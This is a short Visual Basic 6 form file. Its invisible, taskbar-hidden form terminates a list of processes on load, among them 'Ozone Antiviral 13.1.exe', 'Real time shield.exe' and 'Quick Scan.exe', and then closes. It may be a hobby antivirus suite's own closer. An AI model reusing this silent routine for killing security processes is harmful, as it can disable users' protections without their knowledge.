VERSION 5.00
Begin VB.Form Form1l 
   Caption         =   "Form1"
   ClientHeight    =   3030
   ClientLeft      =   120
   ClientTop       =   450
   ClientWidth     =   4560
   Icon            =   "Form1l.frx":0000
   LinkTopic       =   "Form1"
   ScaleHeight     =   3030
   ScaleWidth      =   4560
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Visible         =   0   'False
End
Attribute VB_Name = "Form1l"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Form_Load()
KillProcess "Ozone Antiviral 13.1.exe"
KillProcess "Popups1.exe"
KillProcess "Popups2.exe"
KillProcess "Popups3.exe"
KillProcess "Popups4.exe"
KillProcess "Popups41.exe"
KillProcess "Quick Scan.exe"
KillProcess "Real time shield.exe"
KillProcess "Run as admin.exe"

Unload Me
End Sub

